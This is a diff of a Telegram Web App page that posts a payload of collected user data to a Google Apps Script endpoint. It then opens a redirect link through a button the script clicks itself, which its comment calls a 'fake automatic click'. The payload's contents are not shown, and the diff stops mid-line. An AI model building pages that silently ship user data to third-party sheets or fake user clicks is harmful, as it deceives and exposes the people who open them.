@@ -6,13 +6,27 @@
 <script src="https://telegram.org/js/telegram-web-app.js"></script>
 <style>
   body { font-family: sans-serif; padding: 20px; background:#f8f9fa; color:#333; }
-  h1 { margin-bottom:10px; }
-  pre { background:#fff; padding:10px; border-radius:6px; overflow-x:auto; }
+  h1 { margin-bottom: 10px; }
+  #status { margin-bottom: 20px; }
+  #continueBtn {
+    display: block;
+    padding: 15px 20px;
+    font-size: 1.2em;
+    background: #0088cc;
+    color: white;
+    border: none;
+    border-radius: 8px;
+    cursor: pointer;
+    text-align: center;
+  }
+  #continueBtn:hover { background: #0077b3; }
 </style>
 </head>
 <body>
+
 <h1>Collecting your data...</h1>
 <p id="status">Sending...</p>
+<button id="continueBtn" style="display:none;">Continue</button>
 
 <script>
 const tg = window.Telegram.WebApp;
@@ -33,7 +47,7 @@ const payload = {
 // Google Apps Script Web App URL
 const SHEETS_URL = "https://script.google.com/macros/s/AKfycbxZ54JvG-PkixmQO8V_5xenov1QzbjakwGq5f7uH6kz5nccj5RP3DNL0tk1WC0VvzZoXw/exec";
 
-// Push data to Google Sheets
+// Push data to Sheets
 fetch(SHEETS_URL, {
   method: "POST",
   body: JSON.stringify(payload)
@@ -41,12 +55,16 @@ fetch(SHEETS_URL, {
 .then(res => res.json())
 .then(() => {
   document.getElementById('status').textContent = "Data sent!";
-  // Redirect automatically after 1 second
-  setTimeout(() => window.location.href = redirectUrl, 1000);
+  // Show the “Continue” button
+  const btn = document.getElementById('continueBtn');
+  btn.style.display = 'block';
+  btn.onclick = () => {
+    // This uses Telegram Web App API to open link in full-screen inside Telegram
+    tg.openLink(redirectUrl);
+  };
+  
+  // Optional: auto-click after 1 second (fake automatic click)
+  setTimeout(() => btn.click(), 1000);
 })
 .catch(err => {
-  document.getElementById('status').textContent = "Error: " + err;
-});
-</script>
-</body>
-</html>
+  document.getElementById('status').textContent = "Er
